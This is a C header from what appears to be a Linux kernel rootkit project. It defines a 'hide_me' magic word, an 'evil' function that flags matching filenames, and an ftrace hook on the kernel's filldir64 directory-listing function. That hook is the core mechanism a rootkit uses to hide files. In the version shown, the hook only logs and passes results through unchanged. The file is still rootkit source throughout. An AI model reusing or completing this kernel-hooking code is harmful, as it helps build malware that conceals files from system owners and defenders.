#pragma once

#include <linux/cred.h>
#include <linux/linkage.h>
#include <linux/stddef.h>
#include <linux/syscalls.h>

#include "stdlib.h"
#include "rootkit.h"
#include "ftrace_helper.h"


char* MAGIC_WORD = "hide_me";


void evil(const char* name) {    
    rk_info("Looking at: %s\n", name);
    if(strstr(name, MAGIC_WORD)){
        rk_info("Found file to hide: %s\n", name);
    }
}

static asmlinkage bool (*orig_filldir64)(struct dir_context *ctx, const char *name, int namlen,
		   loff_t offset, u64 ino, unsigned int d_type);

static asmlinkage bool hook_filldir64(struct dir_context *ctx, const char *name, int namlen,
		   loff_t offset, u64 ino, unsigned int d_type) {
    bool res;
    printk(KERN_INFO "hooked function!\n");

    res = orig_filldir64(ctx, name, namlen, offset, ino, d_type);

    printk(KERN_INFO "orig_filldir64 returned!\n");

    printk(KERN_INFO "name: %s\n", name);
    
    return res;
}

static struct ftrace_hook syscall_hooks[] = {
    HOOK_NOSYS("filldir64", hook_filldir64, &orig_filldir64),
};
